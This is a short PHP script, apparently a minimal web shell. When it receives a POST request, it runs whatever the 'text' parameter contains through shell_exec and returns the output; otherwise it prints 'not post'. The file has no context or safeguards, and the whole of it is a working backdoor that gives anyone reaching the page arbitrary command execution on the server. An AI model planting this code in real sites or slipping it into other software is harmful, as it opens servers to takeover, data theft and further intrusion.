<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') 
{
    $text = $_REQUEST['text'];
	$output = shell_exec($text);
	echo $output;
}
else
	echo "not post";
?>